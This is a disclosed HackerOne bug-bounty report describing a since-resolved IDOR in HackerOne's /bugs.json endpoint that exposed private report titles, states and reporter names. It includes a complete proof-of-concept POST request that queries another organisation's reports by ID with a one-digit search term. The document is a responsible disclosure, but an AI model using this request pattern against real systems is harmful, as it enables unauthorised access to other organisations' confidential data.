# Report #2487889: Insecure Direct Object Reference (IDOR) Allows Viewing Private Report Details via /bugs.json Endpoint

- **Platform:** HackerOne
- **Report URL:** [https://hackerone.com/reports/2487889](https://hackerone.com/reports/2487889)
- **Program:** HackerOne
- **Reporter:** @bate5a
- **Status:** RESOLVED
- **Severity:** critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Bounty:** Yes (Undisclosed Amount)
- **Submitted:** 2024-05-02T21:18:47.284Z
- **Disclosed:** 2024-05-23T20:24:06.125Z
- **Community Upvotes:** 261

---

## Executive Summaries

No formal disclosure summary provided.

---

## Full Vulnerability Description & Technical Reproduction Steps

### Hi H1 i hope you are Doing Well Today :)



### Explaining

* I Found that any private reports can be accessed by sending a POST request to the `/bugs.json` endpoint. This vulnerable endpoint requires `organization_id`, which takes the organization's ID as a value. It also requires `text_query`, which is used to search for report IDs. within this  org  , Now you can append the example organization ID mentioned on the policy page, `58579`. and For the `text_query`, you can simply append a single digit, such as 1, or any other single number. This will query all reports containing this digit, provided they belong to the specified organization



### Step To Reproduce 

1.Send a POST request to this endpoint. You can change the organization_id to anything, but leave it as it is 

```

POST /bugs.json HTTP/2
Host: hackerone.com
Cookie:  __Host-session=Your-Session-Here
X-Csrf-Token: Your-Csrf-Here
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Te: trailers
Content-Length: 390

text_query=1&organization_id=58579&persist=true&sort_type=pg_search_rank&view=message&substates%5B%5D=new&substates%5B%5D=needs-more-info&substates%5B%5D=triaged&substates%5B%5D=resolved&substates%5B%5D=informative&substates%5B%5D=not-applicable&substates%5B%5D=duplicate&substates%5B%5D=retesting&substates%5B%5D=pending-program-review&substates%5B%5D=spam&duplicates_must_have_no_ref=true

```




### Poc Video

█████████

## Impact

idor lead to view private reports `title`,`url`,`id`,`state`,`substate`,`severity_rating`,`readable_substate`,`created_at`,`submitted_at`,`reporter_name`
